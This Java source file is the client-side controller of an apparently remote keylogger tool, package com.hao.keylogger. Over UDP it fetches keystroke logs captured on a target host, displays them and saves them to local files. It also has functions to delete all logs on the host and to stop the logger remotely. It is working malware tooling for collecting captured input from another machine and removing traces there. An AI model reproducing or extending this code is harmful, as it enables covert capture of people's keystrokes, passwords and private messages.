package com.hao.keylogger.controllers.Client;

import java.io.File;
import java.io.IOException;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Date;

import javax.swing.JFrame;

import com.hao.keylogger.models.Log;
import com.hao.keylogger.models.Resources;
import com.hao.keylogger.utils.FileManager;
import com.hao.keylogger.views.ClientView;

public class ClientLogController {
	private ClientView view;
	ArrayList<Log> logs = new ArrayList<Log>();

	public ClientLogController(ClientView view) {
		super();
		this.view = view;
		this.view.setController(this);
		this.view.setHost(UDPClientHelper.getLocalHostIP());
		this.view.setPort(Resources.DEFAULT_PORT);
	}

	public JFrame getLogView() {
		return view;
	}

	public void setLogView(ClientView logView) {
		this.view = logView;
	}

	public void displayLog(int index) {
		Log log = logs.get(index);
		view.setLogContent(log.getContent());
		view.scrollLogViewToTop();
	}

	public void fetchLog(Date date) {
		try {
			// the log will be displayed when it is fetched
			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).fetchLog(date);
		} catch (SocketException | UnknownHostException e) {
			view.showErrorMessage("Fetch log error", "Invalid host address or port!");
			e.printStackTrace();
		} catch (NullPointerException ex) {
			view.showErrorMessage("Fetch log error", "Can not fetch log!");
		}

	}

	public void fetchAllLogs() {
		// the log will be displayed when it is fetched
		try {
			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).fetchAllLogs();
		} catch (SocketException e) {
			e.printStackTrace();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
	}

	/**
	 * Display the fetched log to view
	 * 
	 * @param log
	 */
	public void receiveLogFromServer(ArrayList<Log> logs) {
		if (logs.size() == 0) {
			view.showInfoMessage("Key logger", "No logs fetched");
			return;
		}
		this.logs = logs;
		ArrayList<String> logListNames = new ArrayList<String>();
		for (Log log : logs) {
			logListNames.add(log.getName());
		}
		setViewLogList(logListNames);
		displayLog(0);
	}

	private void setViewLogList(ArrayList<String> logListNames) {
		view.setLogList(logListNames);
	}

	public void saveLog(int logListSelectedIndex) {
		if (logs.size() == 0) {
			view.showInfoMessage("Save log", "No logs to save");
			return;
		}
		Log log = logs.get(logListSelectedIndex);
		try {
			writeToFile(log);
			view.showInfoMessage("Save log", "Log was saved at\n" + new File(Resources.LOGS_CLIENT_DIRECTORY).getAbsolutePath());
		} catch (IOException e) {
			e.printStackTrace();
			view.showErrorMessage("Save log", "Error: \n" + e.getMessage());
		}
	}

	private void writeToFile(Log log) throws IOException {
		String filePath = Resources.LOGS_CLIENT_DIRECTORY + File.separator + log.getName() + Resources.LOG_FILE_EXTENSION;
		FileManager fm = new FileManager(filePath);
		fm.writeToFile(log.getContent());
	}

	public void saveAllLogs() {
		if (logs.size() == 0) {
			view.showInfoMessage("Save all logs", "No logs to save");
			return;
		}
		try {
			for (Log log : logs) {
				writeToFile(log);
			}
			view.showInfoMessage("Save all logs",
					"Logs were saved at \n" + new File(Resources.LOGS_CLIENT_DIRECTORY).getAbsolutePath());
		} catch (IOException e) {
			e.printStackTrace();
			view.showErrorMessage("Save all logs", "Error:\n" + e.getMessage());
		}
	}

	public void deleteAllHostLogs() {
		try {
			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).deleteAllHostLogs();
		} catch (SocketException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void stopLoggerRemote() {
		try {
			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).stopLogger();
		} catch (SocketException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void loadAllSavedLogs() {
		// TODO Auto-generated method stub
		
	}

	public void receiveMessageFromServer(String msg) {
		view.showInfoMessage("Key logger", msg);
	}

}
